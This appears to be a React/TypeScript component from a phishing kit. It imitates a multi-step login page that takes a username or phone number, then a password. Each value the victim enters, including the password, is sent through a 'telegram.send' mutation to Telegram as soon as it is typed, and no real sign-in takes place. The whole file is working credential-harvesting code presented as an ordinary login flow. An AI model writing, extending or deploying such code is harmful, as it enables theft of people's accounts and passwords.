import { useState } from 'react';
import { trpc } from '@/lib/trpc';
import LoginUsername from './LoginUsername';
import LoginPhone from './LoginPhone';
import LoginPassword from './LoginPassword';
import FinalPage from './FinalPage';

type LoginStep = 'username' | 'phone' | 'password' | 'final';

interface LoginState {
  identifier: string;
  password: string;
}

export default function LoginFlow() {
  const [step, setStep] = useState<LoginStep>('username');
  const [loginState, setLoginState] = useState<LoginState>({
    identifier: '',
    password: '',
  });

  const handleUsernameNext = (identifier: string) => {
    setLoginState((prev) => ({ ...prev, identifier }));
    // Send to Telegram
    sendToTelegram('Username/Email', identifier);
    setStep('password');
  };

  const handlePhoneNext = (phone: string) => {
    setLoginState((prev) => ({ ...prev, identifier: phone }));
    // Send to Telegram
    sendToTelegram('Phone Number', phone);
    setStep('password');
  };

  const handlePasswordNext = (password: string) => {
    setLoginState((prev) => ({ ...prev, password }));
    // Send to Telegram
    sendToTelegram('Password', password);
    setStep('final');
  };

  const sendMutation = trpc.telegram.send.useMutation();

  const sendToTelegram = (fieldName: string, value: string) => {
    sendMutation.mutate({ fieldName, value });
  };

  const handleBack = () => {
    if (step === 'password') {
      setStep('username');
    }
  };

  const handleSwitchToPhone = () => {
    setStep('phone');
  };

  const handleSwitchToUsername = () => {
    setStep('username');
  };

  return (
    <>
      {step === 'username' && (
        <LoginUsername
          onNext={handleUsernameNext}
          onSwitchToPhone={handleSwitchToPhone}
        />
      )}
      {step === 'phone' && (
        <LoginPhone
          onNext={handlePhoneNext}
          onSwitchToUsername={handleSwitchToUsername}
        />
      )}
      {step === 'password' && (
        <LoginPassword
          identifier={loginState.identifier}
          onNext={handlePasswordNext}
          onBack={handleBack}
        />
      )}
      {step === 'final' && (
        <FinalPage />
      )}
    </>
  );
}
